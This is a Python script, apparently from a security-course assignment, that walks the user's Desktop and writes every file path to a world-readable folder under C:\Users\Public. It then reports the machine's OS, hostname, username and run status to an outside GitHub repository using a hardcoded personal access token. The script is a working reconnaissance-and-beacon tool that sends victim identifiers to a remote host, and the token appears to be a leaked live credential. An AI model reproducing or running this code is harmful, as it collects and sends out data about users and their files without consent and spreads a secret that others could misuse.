class DataSearcher:
    def __init__(self, script_name):
        self.script_name = script_name
        
    def create_log(self,script_name,status):
        '''This function will create a log (succes/failed) depending on the script's results'''
        import socket
        import platform
        import base64
        import getpass
        import datetime
        from github import Github
        import datetime
        ACCESS_TOKEN ='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'
        FOLDER_PATH ='logs'
        current_datetime = datetime.datetime.now()
        content = f"Script Name: {script_name}\nExecution time: {current_datetime}\nStatus: {status}\n\n"
        username = getpass.getuser()
        hostname = socket.gethostname()
        os_name = platform.system()
        filename = os_name + "_" + hostname + "_" + username
        g = Github(ACCESS_TOKEN)
        repo = g.get_repo("rsecurity12/python_opdracht")
        
        try:
            existing_file = repo.get_contents(f"{FOLDER_PATH}/{filename}")
            sha = existing_file.sha
            existing_content = base64.b64decode(existing_file.content).decode()
            new_content = existing_content + '\n' + content
            repo.update_file(existing_file.path, "Update log", new_content, sha)
        except Exception as e:
            if 'Not Found' in str(e):
                new_file = repo.create_file(f"{FOLDER_PATH}/{filename}", "New log", content)
            else:
                pass

    def run(self):
        '''This function will search for all files (even hidden files) in the specified directory and save its output to C Users Public data'''
        import os
        directory_path  = os.path.expanduser(r"~\Desktop")
        gci_path = "C:\\Users\\Public\\gci_output"
        output_file = "C:\\Users\\Public\\gci_output\\gci_output.txt"
        if not os.path.exists(gci_path):
            os.makedirs(gci_path)
        with open(output_file, 'w') as f:
            for root, dirs, files in os.walk(directory_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    f.write(file_path + '\n')

data_searcher = DataSearcher('DataSearcher')
try:
    data_searcher.run()
    data_searcher.create_log(data_searcher.script_name,"success")
except:
    data_searcher.create_log(data_searcher.script_name,"failed")